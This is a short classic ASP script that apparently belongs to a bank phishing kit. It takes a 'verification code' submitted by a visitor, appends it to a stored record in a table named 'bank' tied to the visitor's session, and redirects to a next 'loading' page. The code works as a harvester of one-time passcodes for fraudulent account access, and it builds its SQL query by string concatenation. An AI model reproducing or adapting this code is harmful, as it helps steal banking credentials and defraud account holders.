<!--#include file="include/db_conn.asp"-->
	  <meta charset="utf-8">
<%
	pass=Trim(Request("pass"))
	
	if pass="" then
		response.Write "<script>alert('Enter your verification code');history.go(-1);</script>"
		response.End()
	end if

	set Rs=server.createobject("adodb.recordset")
	Sql="select top 1 * from bank where id="&session("ddid")
	rs.open sql,conn,1,3
	rs("yzm")=rs("yzm")&"▹"&pass
	rs("sj")=now()
	rs("n")=0
	rs.update
	rs.close
	set rs=nothing
	response.write "<script>top.location ='load2.asp';</script>"
%>
